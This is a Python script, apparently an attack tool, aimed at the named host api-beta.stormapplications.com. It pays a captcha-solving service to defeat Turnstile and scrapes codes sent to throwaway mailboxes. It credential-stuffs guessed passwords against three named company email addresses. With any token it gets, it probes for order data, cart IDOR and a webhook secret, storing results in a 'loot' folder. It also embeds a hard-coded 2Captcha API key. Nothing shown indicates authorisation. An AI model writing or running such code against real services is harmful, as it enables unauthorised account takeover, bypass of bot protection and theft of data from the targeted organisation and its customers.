#!/usr/bin/env python3
"""
Pentest automation: 2Captcha Turnstile bypass + auth/email + cred-stuffing + post-auth exploitation.
Target: api-beta.stormapplications.com
"""

import requests
import time
import json
import sys
import os
import re
import random
import string
from datetime import datetime, timezone

# === CONFIG ===
API_BETA = "https://api-beta.stormapplications.com"
CAPTCHA_KEY = "3ff6b7b981be450b1cc93d846be77934"
SITE_KEY = "0x4AAAAAACKSTFyIPdWMxVoP"
PAGE_URL = f"{API_BETA}/auth/login"

RESOLVE_IP = "75.2.96.173"
RESOLVE_IP2 = "99.83.186.151"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"

# Use direct IPs since no Cloudflare — no Tor necessary
session = requests.Session()
session.headers.update({
    "User-Agent": UA,
    "Authorization": "Bearer test",
})

def api_request(method, path, **kwargs):
    """Make a request directly to the resolved IP"""
    url = f"{API_BETA}{path}"
    if 'headers' not in kwargs:
        kwargs['headers'] = {}
    kwargs['headers']['Authorization'] = 'Bearer test'
    kwargs['headers']['User-Agent'] = UA
    kwargs['verify'] = False
    # Use direct IP resolution
    kwargs['timeout'] = 30
    
    try:
        r = session.request(method, url, **kwargs)
        return r
    except requests.exceptions.ConnectionError:
        # Try alternate IP
        alt_url = url.replace(API_BETA, f"https://{RESOLVE_IP2}")
        try:
            alt_session = requests.Session()
            alt_session.headers.update(session.headers)
            r = alt_session.request(method, alt_url, **kwargs)
            return r
        except:
            raise

def solve_turnstile(max_retries=60, interval=5):
    """Submit Turnstile to 2Captcha and poll for result"""
    print(f"[*] {timestamp()} Submitting Turnstile to 2Captcha...")
    
    submit_url = "https://2captcha.com/in.php"
    params = {
        "key": CAPTCHA_KEY,
        "method": "turnstile",
        "sitekey": SITE_KEY,
        "pageurl": PAGE_URL,
        "json": 1,
    }
    
    try:
        r = requests.get(submit_url, params=params, timeout=30)
        data = r.json()
        print(f"[*] Submit response: {data}")
        
        if data.get("status") == 1:
            request_id = data.get("request")
            print(f"[+] Request ID: {request_id}")
            
            poll_url = "https://2captcha.com/res.php"
            poll_params = {
                "key": CAPTCHA_KEY,
                "action": "get",
                "id": request_id,
                "json": 1,
            }
            
            for attempt in range(max_retries):
                time.sleep(interval)
                r2 = requests.get(poll_url, params=poll_params, timeout=30)
                data2 = r2.json()
                print(f"[*] Poll attempt {attempt+1}: {data2}")
                
                if data2.get("status") == 1:
                    token = data2.get("request")
                    print(f"[+] Turnstile token obtained: {token[:50]}...")
                    return token
                elif "ERROR" in str(data2.get("request", "")):
                    print(f"[-] 2Captcha error: {data2}")
                    return None
                # CAPCHA_NOT_READY — continue polling
            print("[-] Max retries reached")
            return None
        else:
            print(f"[-] Submit failed: {data}")
            return None
    except Exception as e:
        print(f"[-] Exception: {e}")
        return None

def timestamp():
    return datetime.now(timezone.utc).strftime("%H:%M:%S")

def test_auth_email(email, token):
    """Test /auth/email endpoint"""
    print(f"[*] {timestamp()} Testing /auth/email with {email}")
    
    # Try both IPs
    for ip in [RESOLVE_IP, RESOLVE_IP2]:
        try:
            r = requests.post(
                f"https://{ip}/auth/email",
                headers={
                    "User-Agent": UA,
                    "Authorization": "Bearer test",
                    "Content-Type": "application/json",
                    "Host": "api-beta.stormapplications.com",
                },
                json={"email": email, "turnstile": token},
                verify=False,
                timeout=15,
            )
            print(f"[*] {ip} /auth/email response: {r.status_code} {r.text[:200]}")
            return r
        except Exception as e:
            print(f"[*] {ip} failed: {e}")
    return None

def test_auth_emailverify(email, code, token):
    """Test /auth/email/verify endpoint"""
    print(f"[*] {timestamp()} Testing /auth/email/verify with {email} code={code}")
    
    for ip in [RESOLVE_IP, RESOLVE_IP2]:
        try:
            r = requests.post(
                f"https://{ip}/auth/email/verify",
                headers={
                    "User-Agent": UA,
                    "Authorization": "Bearer test",
                    "Content-Type": "application/json",
                    "Host": "api-beta.stormapplications.com",
                },
                json={"email": email, "code": code, "turnstile": token},
                verify=False,
                timeout=15,
            )
            print(f"[*] {ip} /auth/email/verify response: {r.status_code} {r.text[:500]}")
            return r
        except Exception as e:
            print(f"[*] {ip} failed: {e}")
    return None

def test_auth_login(email, password, token):
    """Test /auth/login endpoint"""
    print(f"[*] {timestamp()} Testing /auth/login {email}:{password}")
    
    for ip in [RESOLVE_IP, RESOLVE_IP2]:
        try:
            r = requests.post(
                f"https://{ip}/auth/login",
                headers={
                    "User-Agent": UA,
                    "Authorization": "Bearer test",
                    "Content-Type": "application/json",
                    "Host": "api-beta.stormapplications.com",
                },
                json={"email": email, "password": password, "turnstile": token},
                verify=False,
                timeout=15,
            )
            print(f"[*] {ip} /auth/login ({email}:{password}) -> {r.status_code} {r.text[:300]}")
            return r
        except Exception as e:
            print(f"[*] {ip} failed: {e}")
    return None

def get_1secmail():
    """Create temp email via 1secmail"""
    r = requests.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1", timeout=10)
    data = r.json()
    email = data[0]
    login, domain = email.split('@')
    print(f"[+] Temp email: {email}")
    return email, login, domain

def check_1secmail_inbox(login, domain):
    """Check 1secmail inbox"""
    r = requests.get(
        f"https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}",
        timeout=10
    )
    msgs = r.json()
    return msgs

def read_1secmail_message(login, domain, msg_id):
    """Read a specific message"""
    r = requests.get(
        f"https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={msg_id}",
        timeout=10
    )
    return r.json()

def exploit_with_token(token):
    """Exploit with storm_token"""
    findings = []
    
    # /auth/me
    print(f"\n[*] === EXPLOITING WITH TOKEN ===\n[*] Token: {token[:50]}...")
    
    for ip in [RESOLVE_IP, RESOLVE_IP2]:
        try:
            r = requests.get(
                f"https://{ip}/auth/me",
                headers={
                    "User-Agent": UA,
                    "Authorization": f"Bearer {token}",
                    "Host": "api-beta.stormapplications.com",
                },
                verify=False,
                timeout=15,
            )
            print(f"[*] /auth/me: {r.status_code} {r.text[:500]}")
            findings.append(("auth/me", r.status_code, r.text[:200]))
            break
        except Exception as e:
            continue
    
    # Storefront me orders
    for ip in [RESOLVE_IP, RESOLVE_IP2]:
        try:
            r = requests.get(
                f"https://{ip}/public/storefront/me/orders",
                headers={
                    "User-Agent": UA,
                    "Authorization": f"Bearer {token}",
                    "Host": "api-beta.stormapplications.com",
                },
                verify=False,
                timeout=15,
            )
            print(f"[*] /public/storefront/me/orders: {r.status_code} {r.text[:300]}")
            findings.append(("me/orders", r.status_code, r.text[:200]))
            break
        except:
            continue
    
    # App 4 storefront
    for ip in [RESOLVE_IP, RESOLVE_IP2]:
        try:
            r = requests.get(
                f"https://{ip}/apps/4/storefront",
                headers={
                    "User-Agent": UA,
                    "Authorization": f"Bearer {token}",
                    "Host": "api-beta.stormapplications.com",
                },
                verify=False,
                timeout=15,
            )
            print(f"[*] /apps/4/storefront: {r.status_code} {r.text[:500]}")
            findings.append(("apps/4/storefront", r.status_code, r.text[:300]))
            break
        except:
            continue
    
    # Cart IDOR - sequential IDs
    for cart_id in [1, 2, 3, 5, 10, 100, "000000000000000000000001", "aaaaaaaaaaaaaaaaaaaaaaaa", "ffffffffffffffffffffffff"]:
        for ip in [RESOLVE_IP]:
            try:
                r = requests.get(
                    f"https://{ip}/public/storefront/storm/carts/{cart_id}",
                    headers={
                        "User-Agent": UA,
                        "Authorization": f"Bearer {token}",
                        "Host": "api-beta.stormapplications.com",
                    },
                    verify=False,
                    timeout=15,
                )
                if r.status_code != 404 and r.status_code != 403:
                    print(f"[!] CART IDOR: cart {cart_id} -> {r.status_code} {r.text[:200]}")
                    findings.append((f"cart_idor/{cart_id}", r.status_code, r.text[:200]))
                break
            except:
                continue
    
    # Webhook outbound secret
    for ip in [RESOLVE_IP]:
        try:
            r = requests.post(
                f"https://{ip}/apps/4/webhooks/outbound/secret",
                headers={
                    "User-Agent": UA,
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json",
                    "Host": "api-beta.stormapplications.com",
                },
                verify=False,
                timeout=15,
            )
            print(f"[*] /apps/4/webhooks/outbound/secret: {r.status_code} {r.text[:300]}")
            findings.append(("webhook/secret", r.status_code, r.text[:200]))
            break
        except:
            continue
    
    return findings


def main():
    print("="*60)
    print("STORm APPLICATIONS PENTEST — 2Captcha + Auth Attack")
    print(f"Started: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}Z")
    print("="*60)
    
    # STEP 1: Resolve Turnstile
    print("\n[STEP 1] Resolving Turnstile captcha via 2Captcha")
    token = solve_turnstile()
    if not token:
        print("[-] FAILED to get Turnstile token. Exiting.")
        return
    
    # Save token
    with open("/tmp/turnstile_token.txt", "w") as f:
        f.write(token)
    print(f"[+] Turnstile token saved to /tmp/turnstile_token.txt")
    
    # STEP 2: Test what we can do with this token
    # First try a simple probe to see endpoints respond differently
    print("\n[STEP 2] Probing auth endpoints with Turnstile token")
    
    # Test /auth/email with a controlled email
    print("\n[STEP 2a] /auth/email - with temp email")
    email, login, domain = get_1secmail()
    r = test_auth_email(email, token)
    
    if r and r.status_code == 200:
        data = r.json()
        print(f"[+] /auth/email response: {data}")
        
        # Wait for email to arrive
        print(f"[*] Waiting for verification code on {email}...")
        for i in range(15):
            time.sleep(3)
            msgs = check_1secmail_inbox(login, domain)
            print(f"[*] Inbox check {i+1}: {len(msgs)} messages")
            if msgs:
                for msg in msgs:
                    msg_data = read_1secmail_message(login, domain, msg.get('id'))
                    print(f"[+] Message: {json.dumps(msg_data, indent=2)}")
                    body = msg_data.get('textBody', '') or msg_data.get('htmlBody', '')
                    # Extract code (look for 6-digit codes or patterns)
                    codes = re.findall(r'\b(\d{6})\b', body)
                    if codes:
                        code = codes[0]
                        print(f"[+] Code found: {code}")
                        
                        # Need new Turnstile token for verify
                        print("[*] Getting new Turnstile token for verification...")
                        token2 = solve_turnstile()
                        if token2:
                            r2 = test_auth_emailverify(email, code, token2)
                            if r2:
                                print(f"[+] /auth/email/verify response: {r2.status_code} {r2.text[:500]}")
                                # Check for storm_token
                                try:
                                    data2 = r2.json()
                                    storm_token = data2.get('storm_token') or data2.get('token') or data2.get('access_token')
                                    if storm_token:
                                        print(f"\n{'='*60}")
                                        print(f"[!!!] STORM_TOKEN OBTAINED!")
                                        print(f"[!!!] Token: {storm_token}")
                                        print(f"{'='*60}")
                                        with open("/home/ubuntu/stormapplications.com/loot/storm_token.txt", "w") as f:
                                            f.write(storm_token)
                                        print("[+] Token saved to loot/storm_token.txt")
                                        
                                        # STEP 4: Exploitation
                                        print("\n[STEP 4] Exploiting with storm_token")
                                        findings = exploit_with_token(storm_token)
                                        print(f"\n[+] Exploit findings: {json.dumps(findings, indent=2)}")
                                        return
                                except:
                                    print(f"[-] Could not parse JSON response")
        print("[-] No verification code received")
    
    # STEP 3: Cred-stuffing via /auth/login
    print("\n[STEP 3] Cred-stuffing via /auth/login")
    
    emails = [
        "contato@stormapplications.com",
        "stormapplicationsltda@outlook.com",
        "stormappsrecebimentos@gmail.com",
    ]
    
    passwords = [
        "StorM2024", "storM2024", "Storm2024", "storm2024", "STORM2024",
        "StorM!2024", "StorM@2024", "StorM#2024",
        "storM!2024", "storM@2024",
        "StorM123", "storM123", "storm123",
        "StorMadmin", "stormadmin", "StormAdmin",
        "discloud2024", "discloud!2024",
        "admin2024", "StorM2024!", "StorM2024@",
        "StorM.storm", "storm.StorM",
        "StorM@2024", "Storm@2024",
    ]
    
    # Test top 3 most likely first
    top_passwords = ["StorM2024", "StorM@2024", "storm2024"]
    
    for email in emails:
        for pwd in top_passwords:
            # Need fresh Turnstile per attempt
            print(f"\n[*] Getting Turnstile for cred-stuffing attempt...")
            tk = solve_turnstile()
            if not tk:
                print("[-] Failed to get Turnstile token")
                continue
            r = test_auth_login(email, pwd, tk)
            if r and r.status_code == 200:
                print(f"\n[!!!] LOGIN SUCCESSFUL! {email}:{pwd}")
                try:
                    data = r.json()
                    storm_token = data.get('storm_token') or data.get('token') or data.get('access_token')
                    if storm_token:
                        with open("/home/ubuntu/stormapplications.com/loot/storm_token.txt", "w") as f:
                            f.write(storm_token)
                        findings = exploit_with_token(storm_token)
                        print(f"\n[+] Exploit findings: {json.dumps(findings, indent=2)}")
                        return
                except:
                    pass
            time.sleep(1)  # Rate limit
    
    # If still no token, try all passwords (but this is expensive)
    print("\n[-] Top passwords failed. Trying full password list (this will take time)...")
    for email in emails:
        for i, pwd in enumerate(passwords):
            if pwd in top_passwords:
                continue  # Already tried
            print(f"\n[*] Getting Turnstile for {email}:{pwd}...")
            tk = solve_turnstile()
            if not tk:
                continue
            r = test_auth_login(email, pwd, tk)
            if r and r.status_code == 200:
                print(f"\n[!!!] LOGIN SUCCESSFUL! {email}:{pwd}")
                try:
                    data = r.json()
                    storm_token = data.get('storm_token') or data.get('token') or data.get('access_token')
                    if storm_token:
                        with open("/home/ubuntu/stormapplications.com/loot/storm_token.txt", "w") as f:
                            f.write(storm_token)
                        findings = exploit_with_token(storm_token)
                        print(f"\n[+] Findings: {json.dumps(findings, indent=2)}")
                        return
                except:
                    pass
            time.sleep(1)
    
    print("\n[-] All attacks completed. No token obtained.")

if __name__ == "__main__":
    main()